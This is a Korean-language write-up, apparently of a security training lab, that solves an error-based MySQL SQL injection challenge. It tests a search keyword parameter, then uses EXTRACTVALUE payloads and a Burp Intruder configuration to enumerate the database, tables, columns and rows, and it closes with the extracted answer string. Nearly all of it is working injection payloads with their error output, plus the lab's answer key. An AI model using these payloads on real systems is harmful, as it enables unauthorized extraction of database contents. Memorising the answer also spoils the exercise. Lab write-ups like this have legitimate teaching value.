SQL Injection MySQL 6번 - Error-based Burpsuite
===================================
  
1. 공격 과정
	1) 공격 포인트 확인
		참 조건: A%' AND 1=1 AND 'x' LIKE 'x
		=> 기존 A 게시글 정상 조회
		거짓 조건: A%' AND 1=2 AND 'x' LIKE 'x
		=> 조회 결과 없음
	 keyword 파라미터에서 SQL Injection 가능 확인

	2) Error-Based 함수 확인
		페이로드: A%' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT DATABASE()),0x7e)) AND 'x' LIKE 'x
		결과: error code : [1105] XPATH syntax error: '~skinfosec~'
		현재 DB명: skinfosec
		=> 서브쿼리 결과가 에러메시지에 노출되는 것을 확인
		
	3) 테이블 개수 확인
		페이로드: A%'+AND+EXTRACTVALUE(1,CONCAT(0x7e,(SELECT+COUNT(*)+FROM+information_schema.tables+WHERE+table_schema=DATABASE()),0x7e))+AND+'x'+LIKE+'x
		결과: error code : [1105] XPATH syntax error: '~7~'
		=> 테이블 7개 존재

	4) 테이블명 확인 (Burpsuite - Intruder 활용)
		페이로드: A%' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT §0§,1),0x7e)) AND 'x' LIKE 'x
		Intruder 설정:
			- Attack type: Sniper
			- Payload position: LIMIT의 offset
			- Payload type: Numbers
			- From: 0
			- To: 6
			- Step: 1
			- Grep Extract: From [XPATH syntax error: '~] to [~']
		출력 결과: access_log, comm_file, comm_mdi_file, eqst_answer, member, notice, zipcode

	5) eqst_answer 테이블 컬럼 수 확인
		페이로드: A%25'+AND+EXTRACTVALUE(1,CONCAT(0x7e,(SELECT+COUNT(*)+FROM+information_schema.columns+WHERE+table_schema%3dDATABASE()+AND+table_name%3d'eqst_answer'),0x7e))+AND+'x'+LIKE+'x
		결과: error code : [1105] XPATH syntax error: '~1~'
		=> 컬럼 수 한개

	6) eqst_answer 테이블 컬럼명 확인
		페이로드: A%25'+AND+EXTRACTVALUE(1,CONCAT(0x7e,(SELECT+column_name+FROM+information_schema.columns+WHERE+table_schema%3dDATABASE()+AND+table_name%3d'eqst_answer'+LIMIT+0,1),0x7e))+AND+'x'+LIKE+'x
		결과: error code : [1105] XPATH syntax error: '~answer_column~'
		컬럼명: answer_column

	7) 데이터 개수
		페이로드: A%25'+AND+EXTRACTVALUE(1,CONCAT(0x7e,(SELECT+COUNT(*)+FROM+eqst_answer),0x7e))+AND+'x'+LIKE+'x
		결과: error code : [1105] XPATH syntax error: '~1~'
		=> 데이터 한 개 있음

2. 정답
	페이로드: A%25'+AND+EXTRACTVALUE(1,CONCAT(0x7e,(SELECT+answer_column+FROM+eqst_answer+LIMIT+0,1),0x7e))+AND+'x'+LIKE+'x
	결과: error code : [1105] XPATH syntax error: '~skinfosec_eqst_lms_system~'
	정답: skinfosec_eqst_lms_system
